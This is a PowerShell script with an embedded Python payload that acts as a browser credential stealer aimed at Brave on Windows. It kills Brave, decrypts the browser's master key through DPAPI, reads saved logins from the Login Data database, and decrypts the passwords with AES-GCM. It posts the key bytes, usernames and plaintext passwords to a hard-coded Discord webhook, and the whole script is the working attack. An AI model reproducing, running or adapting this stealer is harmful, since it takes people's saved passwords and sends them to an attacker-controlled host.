$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send-Discord {
    param([string]$m)
    try { curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"$m`"}" $wh 2>$null } catch {}
}

Send-Discord "🔍 BRAVE DEBUG MODE"

Get-Process | Where-Object {$_.ProcessName -match "brave"} | Stop-Process -Force -EA 0
Start-Sleep 7

cd $env:TEMP\py

@'
import os,json,base64,sqlite3,shutil,win32crypt,binascii
from Crypto.Cipher import AES

WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

def send(msg):
    try:
        import requests
        requests.post(WH, json={"content": msg[:1900]}, timeout=5)
    except:
        pass

brave_base = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
brave_db = os.path.join(brave_base, "Default", "Login Data")
brave_state = os.path.join(brave_base, "Local State")

# Clé
with open(brave_state, 'r', encoding='utf-8') as f:
    key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]

send(f"Key: {len(key)} bytes | Hex: {binascii.hexlify(key[:16]).decode()}...")

# DB
shutil.copy2(brave_db, 't.db')
import time; time.sleep(2)

conn = sqlite3.connect('t.db', timeout=120)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != '' LIMIT 3")

for i, (url, user, enc_pwd) in enumerate(cursor.fetchall()):
    send(f"\n=== Entry {i+1}: {url[:50]} ===")
    send(f"Username: {user}")
    send(f"Blob length: {len(enc_pwd)} bytes")
    
    # Analyser les premiers bytes
    prefix = enc_pwd[:3]
    send(f"Prefix (3 bytes): {prefix}")
    send(f"Prefix hex: {binascii.hexlify(prefix).decode()}")
    
    # Hex dump des premiers 60 bytes
    hex_dump = binascii.hexlify(enc_pwd[:60]).decode()
    send(f"First 60 bytes hex: {hex_dump}")
    
    # Tentative de déchiffrement avec debug
    try:
        # Méthode standard
        nonce = enc_pwd[3:15]
        ciphertext = enc_pwd[15:-16]
        tag = enc_pwd[-16:]
        
        send(f"Nonce: {len(nonce)} bytes | {binascii.hexlify(nonce).decode()}")
        send(f"Ciphertext: {len(ciphertext)} bytes")
        send(f"Tag: {len(tag)} bytes | {binascii.hexlify(tag).decode()}")
        
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        password = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        send(f"✅ SUCCESS: {password}")
        
    except Exception as e:
        send(f"❌ Standard method failed: {str(e)}")
        
        # Essayer DPAPI
        try:
            password = win32crypt.CryptUnprotectData(enc_pwd, None, None, None, 0)[1].decode('utf-8')
            send(f"✅ DPAPI worked: {password}")
        except Exception as e2:
            send(f"❌ DPAPI also failed: {str(e2)}")

conn.close()
os.remove('t.db')

send("Debug complete")
print("OK")
'@ | Out-File "debug_brave.py" -Encoding UTF8

.\python.exe debug_brave.py 2>&1 | Out-Null

Send-Discord "✅ Debug script executed"
